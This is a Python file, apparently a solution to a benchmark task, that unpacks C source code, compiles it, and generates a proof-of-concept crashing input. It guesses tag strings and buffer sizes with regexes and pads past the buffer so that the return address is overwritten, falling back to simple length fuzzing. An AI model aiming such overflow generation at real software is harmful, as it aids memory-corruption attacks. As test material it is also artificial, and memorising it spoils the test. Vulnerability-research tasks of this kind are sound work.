import os
import re
import subprocess
import tempfile
import tarfile
import sys
import shutil
from pathlib import Path
from typing import List, Optional, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball to temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            extract_path = Path(tmpdir) / "src"
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(extract_path)
            
            # Find C source files
            c_files = list(extract_path.rglob("*.c"))
            if not c_files:
                raise RuntimeError("No C source files found")
            
            # Try to find tag and buffer size by analyzing source
            tag_candidates = self._find_tags(c_files)
            buffer_size = self._find_buffer_size(c_files)
            
            # Compile the program
            exe_path = self._compile(extract_path, c_files)
            
            # Determine PoC based on analysis
            if buffer_size is not None and tag_candidates:
                # Use the first tag candidate and overflow buffer
                tag = tag_candidates[0]
                # Create overflow: tag + padding to exceed buffer
                # Add extra to ensure crash (overwrite return address)
                overflow_len = buffer_size + 100
                padding = b"A" * (overflow_len - len(tag))
                poc = tag.encode() + padding
            else:
                # Fallback: use fuzzing to find crashing input
                poc = self._fuzz_crash(exe_path, tag_candidates)
            
            return poc
    
    def _find_tags(self, c_files: List[Path]) -> List[str]:
        """Find potential tag strings in source code."""
        tags = set()
        tag_patterns = [
            r'strstr\s*\(\s*[^,]+,\s*"([^"]+)"',  # strstr(input, "TAG")
            r'strcmp\s*\(\s*[^,]+,\s*"([^"]+)"',  # strcmp(input, "TAG")
            r'strncmp\s*\(\s*[^,]+,\s*"([^"]+)"', # strncmp(input, "TAG")
            r'if\s*\(.*"([^"]+)".*\)',            # if (..."TAG"...)
            r'==\s*"([^"]+)"',                    # == "TAG"
        ]
        for c_file in c_files:
            content = c_file.read_text(encoding='utf-8', errors='ignore')
            for pattern in tag_patterns:
                for match in re.finditer(pattern, content):
                    tag = match.group(1)
                    if len(tag) > 1 and tag.isprintable():
                        tags.add(tag)
        # Prefer tags that look like markers (e.g., contain 'TAG', 'BEGIN', 'START')
        sorted_tags = sorted(tags, key=lambda t: (
            any(marker in t.upper() for marker in ['TAG', 'BEGIN', 'START', 'DATA']),
            -len(t)
        ), reverse=True)
        return list(sorted_tags)[:5]  # Return top candidates
    
    def _find_buffer_size(self, c_files: List[Path]) -> Optional[int]:
        """Find likely buffer size from array declarations or defines."""
        for c_file in c_files:
            content = c_file.read_text(encoding='utf-8', errors='ignore')
            # Look for char buffer[SIZE] patterns
            buffer_pattern = r'char\s+\w+\s*\[\s*(\d+)\s*\]'
            for match in re.finditer(buffer_pattern, content):
                size = int(match.group(1))
                if 100 <= size <= 10000:  # Reasonable buffer range
                    return size
            # Look for #define BUFFER_SIZE 1024
            define_pattern = r'#define\s+\w+\s+(\d+)'
            for match in re.finditer(define_pattern, content):
                size = int(match.group(1))
                if 100 <= size <= 10000:
                    return size
        return None
    
    def _compile(self, extract_path: Path, c_files: List[Path]) -> Path:
        """Compile the program and return path to executable."""
        # First try to use Makefile
        makefiles = list(extract_path.rglob("Makefile")) + list(extract_path.rglob("makefile"))
        if makefiles:
            makefile_dir = makefiles[0].parent
            subprocess.run(["make", "clean"], cwd=makefile_dir, capture_output=True)
            result = subprocess.run(["make"], cwd=makefile_dir, capture_output=True)
            if result.returncode == 0:
                # Find the compiled executable
                for pattern in ["*", "*.exe", "a.out", "program"]:
                    matches = list(makefile_dir.glob(pattern))
                    for match in matches:
                        if os.access(match, os.X_OK) and not match.is_dir():
                            return match
        # Fallback: compile all C files with gcc
        exe_path = extract_path / "program"
        cmd = ["gcc", "-o", str(exe_path)] + [str(f) for f in c_files]
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            # Try with common flags
            cmd = ["gcc", "-o", str(exe_path), "-w", "-std=c99"] + [str(f) for f in c_files]
            result = subprocess.run(cmd, capture_output=True)
            if result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {result.stderr}")
        return exe_path
    
    def _test_crash(self, exe_path: Path, input_data: bytes) -> bool:
        """Test if program crashes with given input."""
        try:
            proc = subprocess.run(
                [str(exe_path)],
                input=input_data,
                capture_output=True,
                timeout=2
            )
            # Crash if terminated by signal (negative return code on Unix)
            return proc.returncode < 0 or proc.returncode > 128
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def _fuzz_crash(self, exe_path: Path, tag_candidates: List[str]) -> bytes:
        """Fuzz to find a crashing input."""
        # Try various tag candidates
        for tag in tag_candidates + [""]:
            # Start with a reasonably long input
            for length in [500, 1000, 1500, 2000]:
                input_data = tag.encode() + b"A" * (length - len(tag))
                if self._test_crash(exe_path, input_data):
                    return input_data
        # Last resort: very long input without tag
        return b"A" * 2000